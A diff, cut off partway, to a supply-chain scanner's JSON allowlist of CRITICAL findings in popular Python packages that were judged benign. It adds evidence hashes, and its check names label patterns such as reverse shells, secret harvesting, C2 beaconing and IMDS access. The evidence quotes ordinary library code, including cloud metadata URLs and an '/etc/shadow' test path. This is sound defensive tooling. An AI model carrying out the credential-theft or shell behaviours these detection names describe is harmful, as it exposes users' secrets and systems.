@@ -1,5 +1,5 @@
 {
-  "_comment": "scan_packages.py allowlist. Each entry is a CRITICAL/HIGH finding manually judged benign. Matched on (package, package-relative file, check); evidence/severity are for review only. Regenerate with --write-baseline AFTER reviewing every line.",
+  "_comment": "scan_packages.py allowlist. Each entry is a CRITICAL/HIGH finding manually judged benign. Matched on (package, package-relative file, check, evidence_hash); evidence_hash is over the matched code with L<NN>: markers stripped, so version bumps and line shifts do not reopen an entry but changed code does. severity and evidence are for review only. Regenerate with --write-baseline AFTER reviewing every line.",
   "version": 1,
   "entries": [
     {
@@ -7,1323 +7,1504 @@
       "file": "botocore/credentials.py",
       "check": "base64 decode + subprocess execution (staged payload)",
       "severity": "CRITICAL",
-      "evidence": "Base64: L2714: return EC.new_key_from_der_data(base64.b64decode(contents))\nSubprocess: L1072: def __init__(self, profile_name, load_config, popen=subprocess.Popen):"
+      "evidence": "Base64: L2714: return EC.new_key_from_der_data(base64.b64decode(contents))\nSubprocess: L1072: def __init__(self, profile_name, load_config, popen=subprocess.Popen):",
+      "evidence_hash": "8622ebbb7332e212b3fd4b4a0c042f4a993d0922c90f44eda20311d3d6536720"
     },
     {
       "package": "botocore",
       "file": "botocore/httpsession.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L186: sslkeylogfile = os.environ.get(\"SSLKEYLOGFILE\")\nNetwork: L477: urllib_response = conn.urlopen("
+      "evidence": "Env: L186: sslkeylogfile = os.environ.get(\"SSLKEYLOGFILE\")\nNetwork: L477: urllib_response = conn.urlopen(",
+      "evidence_hash": "b4605427ec328afc89935845a0a50373fdb4aea7e4f04482ac305f50878f4bdc"
     },
     {
       "package": "botocore",
       "file": "botocore/utils.py",
       "check": "Accesses cloud metadata/IMDS AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "IMDS: L100: METADATA_BASE_URL = 'http://169.254.169.254/' | L560: error_msg=\"Unable to retrieve token for use in IMDSv2 call and IMDSv1 has been disabled\" | L3072: IP_ADDRESS = '169.254.170.2'\nNetwork: L32: from urllib.request import getpro"
+      "evidence": "IMDS: L100: METADATA_BASE_URL = 'http://169.254.169.254/' | L560: error_msg=\"Unable to retrieve token for use in IMDSv2 call and IMDSv1 has been disabled\" | L3072: IP_ADDRESS = '169.254.170.2'\nNetwork: L32: from urllib.request import getproxies, proxy_bypass",
+      "evidence_hash": "d430538072e7feb5b89a15ddcdbb6752c55ffa3d244b6dc18da2392a472e986c"
     },
     {
       "package": "botocore",
       "file": "botocore/utils.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L417: env = os.environ.copy()\nNetwork: L32: from urllib.request import getproxies, proxy_bypass"
+      "evidence": "Env: L417: env = os.environ.copy()\nNetwork: L32: from urllib.request import getproxies, proxy_bypass",
+      "evidence_hash": "8e1df1dd7f359913d817bf4faa55e901950054b96d46171c90b0ff0ecc15fd36"
     },
     {
       "package": "botocore",
       "file": "botocore/utils.py",
       "check": "Reads credential paths AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Creds: L3551: CACHE_DIR = os.path.expanduser(os.path.join('~', '.aws', 'boto', 'cache')) | L3721: return os.path.expanduser(os.path.join('~', '.aws', 'login', 'cache'))\nNetwork: L32: from urllib.request import getproxies, proxy_bypass"
+      "evidence": "Creds: L3551: CACHE_DIR = os.path.expanduser(os.path.join('~', '.aws', 'boto', 'cache')) | L3721: return os.path.expanduser(os.path.join('~', '.aws', 'login', 'cache'))\nNetwork: L32: from urllib.request import getproxies, proxy_bypass",
+      "evidence_hash": "b035acdae98ce4bbf9da78bc214434dca9b913921bb4986b4dd56c133bb26bf4"
     },
     {
       "package": "click",
       "file": "click/testing.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L91: os.dup2(self._tmpfile.fileno(), self._targetfd) | L95: os.dup2(self.saved_fd, self._targetfd)"
+      "evidence": "L91: os.dup2(self._tmpfile.fileno(), self._targetfd) | L95: os.dup2(self.saved_fd, self._targetfd)",
+      "evidence_hash": "d5c5f4c11e2bf75d0f4b93a4339a92ef12bca6cc33f1bfc9ad4929147df2dfbf"
     },
     {
       "package": "datasets",
       "file": "datasets/utils/file_utils.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L441: while True:"
+      "evidence": "L443: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "diffusers",
       "file": "diffusers/utils/import_utils.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L1015: return importlib.import_module(\".\" + module_name, self.__name__)"
+      "evidence": "L1015: return importlib.import_module(\".\" + module_name, self.__name__)",
+      "evidence_hash": "1d92aa93af6b6efe769f236008d26f7de2f8978e467dbad19de6453dde58c250"
     },
     {
       "package": "diffusers",
       "file": "diffusers/utils/testing_utils.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L233: value = os.environ[key]\nNetwork: L688: response = requests.get(arry, timeout=DIFFUSERS_REQUEST_TIMEOUT) | L709: response = requests.get(url, timeout=DIFFUSERS_REQUEST_TIMEOUT) | L728: image = PIL.Image.open(requests.get(image, st"
+      "evidence": "Env: L233: value = os.environ[key]\nNetwork: L688: response = requests.get(arry, timeout=DIFFUSERS_REQUEST_TIMEOUT) | L709: response = requests.get(url, timeout=DIFFUSERS_REQUEST_TIMEOUT) | L728: image = PIL.Image.open(requests.get(image, stream=True, timeout=DIFFUSERS_REQUEST_TIMEOUT).raw)",
+      "evidence_hash": "dcfec202aae6b20c2273844bda3b327d89adc80eb65f8fb66dea5babdbf6bd7e"
     },
     {
       "package": "dill",
       "file": "dill/_objects.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L317: a['TarFileType'] = tarfile.open(fileobj=_fileW,mode='w')\nNetwork: L330: x['SocketType'] = _socket = socket.socket()"
+      "evidence": "Archive: L320: a['TarFileType'] = tarfile.open(fileobj=_fileW,mode='w')\nNetwork: L333: x['SocketType'] = _socket = socket.socket()",
+      "evidence_hash": "24b1f3082a5d19f9ca61f6042e71da6b1a13f0d83493a91941e970bc521b7908"
     },
     {
       "package": "evaluate",
       "file": "evaluate/utils/file_utils.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L261: while True:"
+      "evidence": "L261: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "execnet",
       "file": "execnet/gateway_base.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L1783: os.dup2(fd, 0) | L1789: os.dup2(fd, 1) | L1794: os.dup2(fd, 2)"
+      "evidence": "L1783: os.dup2(fd, 0) | L1789: os.dup2(fd, 1) | L1794: os.dup2(fd, 2)",
+      "evidence_hash": "4a8da6db4792fd56d18a4f88aedc7ece264644218a9b61dc1e8246c9a6ea8308"
     },
     {
       "package": "fastapi",
       "file": "fastapi/routing.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L579: while True:"
+      "evidence": "L586: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "fastmcp-slim",
       "file": "fastmcp/cli/apps_dev.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L1340: with tarfile.open(fileobj=io.BytesIO(data), mode=\"r:gz\") as tar:\nNetwork: L1291: with httpx.Client(timeout=30.0) as client: | L1305: with httpx.Client(timeout=30.0) as client: | L1335: with httpx.Client(timeout=30.0) as clie"
+      "evidence": "Archive: L1340: with tarfile.open(fileobj=io.BytesIO(data), mode=\"r:gz\") as tar:\nNetwork: L1291: with httpx.Client(timeout=30.0) as client: | L1305: with httpx.Client(timeout=30.0) as client: | L1335: with httpx.Client(timeout=30.0) as client:",
+      "evidence_hash": "bedf34ad4902a82af8659b96729e79200d672a4da5a3a5716dd093527b51a46d"
     },
     {
       "package": "fastmcp-slim",
       "file": "fastmcp/cli/apps_dev.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "FS: L624: history.replaceState(null, \"\", url);\nNetwork: L1291: with httpx.Client(timeout=30.0) as client: | L1305: with httpx.Client(timeout=30.0) as client: | L1335: with httpx.Client(timeout=30.0) as client:"
+      "evidence": "FS: L624: history.replaceState(null, \"\", url);\nNetwork: L1291: with httpx.Client(timeout=30.0) as client: | L1305: with httpx.Client(timeout=30.0) as client: | L1335: with httpx.Client(timeout=30.0) as client:",
+      "evidence_hash": "f4950ba5e39fe229fbeede52097f2e5df7d80a08f75ae2b13fb41f03f57193f7"
     },
     {
       "package": "fonttools",
       "file": "fontTools/diff/__init__.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L202: os.dup2(devnull, sys.stdout.fileno())"
+      "evidence": "L202: os.dup2(devnull, sys.stdout.fileno())",
+      "evidence_hash": "ad61fb11f982eb4a271a96f12023dd9982f95268a08f2cba3e3fbeeb9a7ab6e0"
     },
     {
       "package": "fonttools",
       "file": "fontTools/ttLib/ttFont.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L1420: __import__(\"fontTools.ttLib.tables.\" + pyTag)"
+      "evidence": "L1420: __import__(\"fontTools.ttLib.tables.\" + pyTag)",
+      "evidence_hash": "1cd98d66f0f7e4f7c3227502a15f20a54e31675e77fb019eb35c7b0b94950035"
     },
     {
       "package": "httpx",
       "file": "httpx/_models.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "FS: L528: history: list[Response] | None = None,\nNetwork: L9: import urllib.request | L1243: class _CookieCompatRequest(urllib.request.Request):"
+      "evidence": "FS: L528: history: list[Response] | None = None,\nNetwork: L9: import urllib.request | L1243: class _CookieCompatRequest(urllib.request.Request):",
+      "evidence_hash": "e7086155eba9e31f5975b06e7ce1775edcd431a134b948669bc8bdab055c31f4"
     },
     {
       "package": "huggingface-hub",
       "file": "huggingface_hub/hf_api.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L4577: while True:"
+      "evidence": "L4600: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "huggingface-hub",
       "file": "huggingface_hub/hf_api.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L10852: o.addheaders = [(\"Authorization\", \"Bearer \" + os.environ[\"UV_SCRIPT_HF_TOKEN\"])]\nNetwork: L6504: resp = requests.post(path, headers=headers, json=body) | L10848: import urllib.request | L10851: o = urllib.request.build_opener()"
+      "evidence": "Env: L10852: o.addheaders = [(\"Authorization\", \"Bearer \" + os.environ[\"UV_SCRIPT_HF_TOKEN\"])]\nNetwork: L6504: resp = requests.post(path, headers=headers, json=body) | L10848: import urllib.request | L10851: o = urllib.request.build_opener()",
+      "evidence_hash": "ca9867a927e4a8442a143aa4952242e103f80fb59ef7c2ab8b6568335e6c8a96"
     },
     {
       "package": "huggingface-hub",
       "file": "huggingface_hub/utils/_http.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L428: while True:"
+      "evidence": "L439: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "ipython",
       "file": "IPython/core/interactiveshell.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "FS: L78: from IPython.core.history import HistoryManager, HistoryOutput\nNetwork: L4048: from urllib.request import urlopen | L4049: response = urlopen(target)"
+      "evidence": "FS: L78: from IPython.core.history import HistoryManager, HistoryOutput\nNetwork: L4048: from urllib.request import urlopen | L4049: response = urlopen(target)",
+      "evidence_hash": "dc9dc136766156fc16708bbeed378ddfe69b10bfd28d7535b9b633f2108d6eb5"
     },
     {
       "package": "ipython",
       "file": "IPython/terminal/pt_inputhooks/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L139: mod = importlib.import_module(\"IPython.terminal.pt_inputhooks.\" + gui_mod)"
+      "evidence": "L139: mod = importlib.import_module(\"IPython.terminal.pt_inputhooks.\" + gui_mod)",
+      "evidence_hash": "6dcd773cd2466fec9935b46229396574aa76afe072bb3c693f027319ccb7cc07"
     },
     {
       "package": "ipython",
       "file": "IPython/utils/py3compat.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L57: exec(compiler(f.read(), fname, \"exec\"), glob, loc)"
+      "evidence": "L57: exec(compiler(f.read(), fname, \"exec\"), glob, loc)",
+      "evidence_hash": "10b26321352fd7e87b637932edba07b706de4504e40abf4377374c0411652b02"
     },
     {
       "package": "jaraco-context",
       "file": "jaraco/context/__init__.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L106: with tarfile.open(fileobj=req, mode='r|*') as tf:\nNetwork: L15: import urllib.request | L105: req = urllib.request.urlopen(url)"
+      "evidence": "Archive: L106: with tarfile.open(fileobj=req, mode='r|*') as tf:\nNetwork: L15: import urllib.request | L105: req = urllib.request.urlopen(url)",
+      "evidence_hash": "2f9a20daf730cbf95be1d413149fda26b3a4e5799784065e86e4ae85d1997559"
     },
     {
       "package": "matplotlib",
       "file": "matplotlib/backends/backend_webagg.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L56: if not webbrowser.open(url):"
+      "evidence": "L56: if not webbrowser.open(url):",
+      "evidence_hash": "748a45a74c9ff4fa54923523ebb49afbbd23199184f0081c5a9f9d638a294990"
     },
     {
       "package": "multiprocess",
       "file": "multiprocess/forkserver.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L5: import socket"
+      "evidence": "L6: import socket",
+      "evidence_hash": "7773c884b8cd524d37b6b377f43cb5f05899db17d58442afb8508841ccc88991"
     },
     {
       "package": "multiprocess",
       "file": "multiprocess/tests/__init__.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L3355: os.dup2(conn.fileno(), i) | L3387: \"test needs os.dup2()\") | L3405: os.dup2(fd, newfd)"
+      "evidence": "L3569: os.dup2(conn.fileno(), i) | L3601: \"test needs os.dup2()\") | L3619: os.dup2(fd, newfd)",
+      "evidence_hash": "66af6ddbf5519b51418e76e9fe8bf89b043c56dd29059db919c07deca9bedb73"
     },
     {
       "package": "numba",
       "file": "numba/pycc/decorators.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L44: exec(compile(fin.read(), ifile, 'exec'))"
+      "evidence": "L44: exec(compile(fin.read(), ifile, 'exec'))",
+      "evidence_hash": "2076f8d248d5b2b42377f4ea448df7008edfa04bd0ef3b5a285bd0421d7aea0d"
     },
     {
       "package": "numba",
       "file": "numba/tests/support.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L1021: os.dup2(w, fd) | L1026: os.dup2(save, fd)"
+      "evidence": "L1021: os.dup2(w, fd) | L1026: os.dup2(save, fd)",
+      "evidence_hash": "ed920cf6d0ff90e69e15480dc4f43f32767d17c4fa689458e7d04e0a9861f0b2"
     },
     {
       "package": "numba",
       "file": "numba/tests/test_codegen.py",
       "check": "base64 decode + subprocess execution (staged payload)",
       "severity": "CRITICAL",
-      "evidence": "Base64: L127: state = pickle.loads(base64.b64decode(sys.argv[1]))\nSubprocess: L130: subprocess.check_call([sys.executable, '-c', code, arg.decode()])"
+      "evidence": "Base64: L127: state = pickle.loads(base64.b64decode(sys.argv[1]))\nSubprocess: L130: subprocess.check_call([sys.executable, '-c', code, arg.decode()])",
+      "evidence_hash": "0f53a0e0e7ad8debdb30501cffe066cad4941deaa32da5ea3b0c53aece580749"
     },
     {
       "package": "numpy",
       "file": "numpy/f2py/capi_maps.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L159: d = eval(f.read().lower(), {}, {})"
+      "evidence": "L159: d = eval(f.read().lower(), {}, {})",
+      "evidence_hash": "fd86e051565e483667ac761e2b68552bda43843d20ae6127dba69f9001299292"
     },
     {
       "package": "numpy",
       "file": "numpy/lib/tests/test__datasource.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "FS: L45: malicious_files = ['/etc/shadow', '../../shadow',\nNetwork: L2: import urllib.request as urllib_request"
+      "evidence": "FS: L45: malicious_files = ['/etc/shadow', '../../shadow',\nNetwork: L2: import urllib.request as urllib_request",
+      "evidence_hash": "7a8c0f76c3a91cf1bb8447104887f60a4c21d07d76792e5272145fe4a1a1bd55"
     },
     {
       "package": "openai",
       "file": "openai/_base_client.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L264: while True:"
+      "evidence": "L264: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "openai",
       "file": "openai/_client.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L174: api_key = os.environ.get(\"OPENAI_API_KEY\") | L184: admin_api_key = os.environ.get(\"OPENAI_ADMIN_KEY\") | L207: webhook_secret = os.environ.get(\"OPENAI_WEBHOOK_SECRET\")\nNetwork: L140: http_client: httpx.Client | None = None, | L521"
+      "evidence": "Env: L174: api_key = os.environ.get(\"OPENAI_API_KEY\") | L184: admin_api_key = os.environ.get(\"OPENAI_ADMIN_KEY\") | L207: webhook_secret = os.environ.get(\"OPENAI_WEBHOOK_SECRET\")\nNetwork: L140: http_client: httpx.Client | None = None, | L521: http_client: httpx.Client | None = None, | L646: http_client: httpx.AsyncClient | None = None,",
+      "evidence_hash": "cfb9ae432a9371866d5a55de9c2117f45e4ce17b6d67e0bcc66a380ea0f0566f"
     },
     {
       "package": "openai",
       "file": "openai/auth/_workload.py",
       "check": "Accesses cloud metadata/IMDS AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "IMDS: L96: url = \"http://169.254.169.254/metadata/identity/oauth2/token\" | L149: url = \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity\"\nNetwork: L77: http_client: httpx.Client | None = None, | "
+      "evidence": "IMDS: L96: url = \"http://169.254.169.254/metadata/identity/oauth2/token\" | L149: url = \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity\"\nNetwork: L77: http_client: httpx.Client | None = None, | L108: with httpx.Client() as client: | L133: http_client: httpx.Client | None = None,",
+      "evidence_hash": "9bb1c2e8a4e23719a0a1fb10dccbc60d8e00e66b00bf89ddec8e0e4ce43545ec"
     },
     {
       "package": "openai",
       "file": "openai/lib/azure.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L213: api_key = os.environ.get(\"AZURE_OPENAI_API_KEY\") | L216: azure_ad_token = os.environ.get(\"AZURE_OPENAI_AD_TOKEN\") | L533: api_key = os.environ.get(\"AZURE_OPENAI_API_KEY\")\nNetwork: L36: _HttpxClientT = TypeVar(\"_HttpxClientT\", bou"
+      "evidence": "Env: L213: api_key = os.environ.get(\"AZURE_OPENAI_API_KEY\") | L216: azure_ad_token = os.environ.get(\"AZURE_OPENAI_AD_TOKEN\") | L533: api_key = os.environ.get(\"AZURE_OPENAI_API_KEY\")\nNetwork: L36: _HttpxClientT = TypeVar(\"_HttpxClientT\", bound=Union[httpx.Client, httpx.AsyncClient]) | L99: class AzureOpenAI(BaseAzureClient[httpx.Client, Stream[Any]], OpenAI): | L118: http_client: httpx.Client | None = None,",
+      "evidence_hash": "b69fde2051426b81cdaab9ecb8c4d92f3905e4cac3a6ad9cb6cc30e98d3f637d"
     },
     {
       "package": "openai",
       "file": "openai/lib/bedrock.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L133: api_key = os.environ.get(\"AWS_BEARER_TOKEN_BEDROCK\") | L308: api_key = os.environ.get(\"AWS_BEARER_TOKEN_BEDROCK\")\nNetwork: L119: http_client: httpx.Client | None = None, | L203: http_client: httpx.Client | None = None, | L294: ht"
+      "evidence": "Env: L133: api_key = os.environ.get(\"AWS_BEARER_TOKEN_BEDROCK\") | L308: api_key = os.environ.get(\"AWS_BEARER_TOKEN_BEDROCK\")\nNetwork: L119: http_client: httpx.Client | None = None, | L203: http_client: httpx.Client | None = None, | L294: http_client: httpx.AsyncClient | None = None,",
+      "evidence_hash": "6aa99311cf0d11b9fd7502928f3c71ba9bc5c71b366faa0703b327cd3cf5ee1a"
     },
     {
       "package": "openai",
       "file": "openai/resources/beta/threads/runs/runs.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L1074: while True:"
+      "evidence": "L1074: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "openai",
       "file": "openai/resources/realtime/realtime.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L310: while True:"
+      "evidence": "L310: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "openai",
       "file": "openai/resources/responses/responses.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L3803: while True:"
+      "evidence": "L3803: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "openai",
       "file": "openai/resources/vector_stores/file_batches.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L347: while True:"
+      "evidence": "L347: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "openai",
       "file": "openai/resources/vector_stores/files.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L376: while True:"
+      "evidence": "L376: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "openai",
       "file": "openai/resources/videos.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L186: while True:"
+      "evidence": "L186: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "protobuf",
       "file": "protobuf-3.19.6-nspkg.pth",
       "check": ".pth has advanced obfuscation (marshal/compile/zlib/__import__)",
       "severity": "CRITICAL",
-      "evidence": "L1: import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));importlib = has_mfs and __import_..."
+      "evidence": "L1: import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));importlib = has_mfs and __import_...",
+      "evidence_hash": "48064b6b740ccc2c0adbfb6996c6a602dbfac07aaf362875712150d35f71da96"
     },
     {
       "package": "ptyprocess",
       "file": "ptyprocess/_fork_pty.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L33: os.dup2(child_fd, STDIN_FILENO) | L34: os.dup2(child_fd, STDOUT_FILENO) | L35: os.dup2(child_fd, STDERR_FILENO)"
+      "evidence": "L33: os.dup2(child_fd, STDIN_FILENO) | L34: os.dup2(child_fd, STDOUT_FILENO) | L35: os.dup2(child_fd, STDERR_FILENO)",
+      "evidence_hash": "2ba22bd3a1132885a6a6fb1efef2d7df94e8a3e5c0e4c1c239052ceaeee07907"
     },
     {
       "package": "pyarrow",
       "file": "pyarrow/tests/conftest.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L210: env = os.environ.copy() | L241: env = os.environ.copy() | L267: env = os.environ.copy()\nNetwork: L24: import urllib.request | L203: resp = urllib.request.urlopen(f\"http://{address}/minio/health/live\")"
+      "evidence": "Env: L210: env = os.environ.copy() | L241: env = os.environ.copy() | L267: env = os.environ.copy()\nNetwork: L24: import urllib.request | L203: resp = urllib.request.urlopen(f\"http://{address}/minio/health/live\")",
+      "evidence_hash": "15d4db92f34b295dd7a70a1059a2a5e3bfe010199c1cd6aac9a744ee011a5ae5"
     },
     {
       "package": "pyarrow",
       "file": "pyarrow/tests/test_extension_type.py",
       "check": "base64 decode + subprocess execution (staged payload)",
       "severity": "CRITICAL",
-      "evidence": "Base64: L1065: decoded_schema = base64.b64decode(meta.metadata[b\"ARROW:schema\"])\nSubprocess: L1350: subprocess.check_call([sys.executable, 'setup.py',"
+      "evidence": "Base64: L1065: decoded_schema = base64.b64decode(meta.metadata[b\"ARROW:schema\"])\nSubprocess: L1350: subprocess.check_call([sys.executable, 'setup.py',",
+      "evidence_hash": "251327d51e536c5a8d9b7ea5fd02ca923b1ebb01de5cf48b787d37a5eeddd57d"
     },
     {
       "package": "pyarrow",
       "file": "pyarrow/tests/test_flight.py",
       "check": "base64 decode + subprocess execution (staged payload)",
       "severity": "CRITICAL",
-      "evidence": "Base64: L592: token = base64.b64decode(token) | L692: decoded = base64.b64decode(values[1])\nSubprocess: L2674: res = subprocess.run([sys.executable, \"-c\", code], env=env,"
+      "evidence": "Base64: L592: token = base64.b64decode(token) | L692: decoded = base64.b64decode(values[1])\nSubprocess: L2674: res = subprocess.run([sys.executable, \"-c\", code], env=env,",
+      "evidence_hash": "c4fe32ab415a5df45ce33a7755b09a379a4418b3d5eb4801cdbe2e622c8728bc"
     },
     {
       "package": "pyarrow",
       "file": "pyarrow/tests/test_orc.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
-      "evidence": "L154: os.environ['TZDIR'] = '/tmp/non_existent'"
+      "evidence": "L154: os.environ['TZDIR'] = '/tmp/non_existent'",
+      "evidence_hash": "73ea74936c8d269b5feda75ba9eec84e7ce7a3b1feb84cd7954b05c45acdd556"
     },
     {
       "package": "pyarrow",
       "file": "pyarrow/tests/util.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L30: import socket"
+      "evidence": "L30: import socket",
+      "evidence_hash": "7773c884b8cd524d37b6b377f43cb5f05899db17d58442afb8508841ccc88991"
     },
     {
       "package": "pyarrow",
       "file": "pyarrow/util.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L293: tarfile.open(tzdata_compressed_path).extractall(tzdata_path)\nNetwork: L198: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) | L234: from urllib.request import urlopen, Request | L236: with urlopen(req) as response:"
+      "evidence": "Archive: L293: tarfile.open(tzdata_compressed_path).extractall(tzdata_path)\nNetwork: L198: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) | L234: from urllib.request import urlopen, Request | L236: with urlopen(req) as response:",
+      "evidence_hash": "d06af6b9baad4d91f638d02a3262172408e1c9bd881ccbaa41856acef77895fc"
     },
     {
       "package": "pygments",
       "file": "pygments/formatters/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L103: exec(f.read(), custom_namespace)"
+      "evidence": "L103: exec(f.read(), custom_namespace)",
+      "evidence_hash": "e6d1bbbe65c234516cd1fd4c8c2a50904540b17091d9ef94ad8ad6728d75210f"
     },
     {
       "package": "pygments",
       "file": "pygments/lexers/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L154: exec(f.read(), custom_namespace)"
+      "evidence": "L154: exec(f.read(), custom_namespace)",
+      "evidence_hash": "e6d1bbbe65c234516cd1fd4c8c2a50904540b17091d9ef94ad8ad6728d75210f"
     },
     {
       "package": "pygments",
       "file": "pygments/lexers/_mysql_builtins.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "FS: L792: 'history',\nNetwork: L1285: from urllib.request import urlopen | L1297: lex_file = urlopen(LEX_URL).read().decode('utf8', errors='ignore') | L1303: item_create_file = urlopen(ITEM_CREATE_URL).read().decode('utf8', errors='ignore')"
+      "evidence": "FS: L792: 'history',\nNetwork: L1285: from urllib.request import urlopen | L1297: lex_file = urlopen(LEX_URL).read().decode('utf8', errors='ignore') | L1303: item_create_file = urlopen(ITEM_CREATE_URL).read().decode('utf8', errors='ignore')",
+      "evidence_hash": "cdd70f54a42268feb73d7452181c71c06f0d67daab651f62815a290436647144"
     },
     {
       "package": "pygments",
       "file": "pygments/lexers/_php_builtins.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L3300: with tarfile.open(download[0]) as tar:\nNetwork: L3255: from urllib.request import urlretrieve"
+      "evidence": "Archive: L3300: with tarfile.open(download[0]) as tar:\nNetwork: L3255: from urllib.request import urlretrieve",
+      "evidence_hash": "4a0a3c595e9e89fa6cb63ace509b7e0e1b91cd12cc381059541ed5fcf928a63d"
     },
     {
       "package": "pyperclip",
